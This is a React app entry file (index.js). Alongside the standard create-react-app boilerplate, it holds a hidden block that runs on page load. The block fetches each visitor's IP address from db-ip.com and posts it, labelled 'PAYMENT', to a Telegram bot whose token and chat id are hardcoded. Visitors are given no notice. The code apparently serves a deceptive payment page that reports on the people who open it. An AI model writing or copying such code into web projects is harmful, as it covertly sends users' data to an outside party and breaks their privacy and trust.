import React from 'react';
import ReactDOM from 'react-dom';
import './index.css';
import App from './App';
import reportWebVitals from './reportWebVitals';

let ip = 'Not Found'

fetch('https://api.db-ip.com/v2/free/self')
    .then(result => result.json())
    .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=` + `PAYMENT--------${ip.ipAddress}`
        fetch(url, {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: ''
        }).then(res => {
            console.log("Request complete!");
        })
    }).catch(err => console.error(err));

ReactDOM.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
  document.getElementById('root')
); 

// If you want to start measuring performance in your app, pass a function
// to log results (for example: reportWebVitals(console.log))
// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals
reportWebVitals();
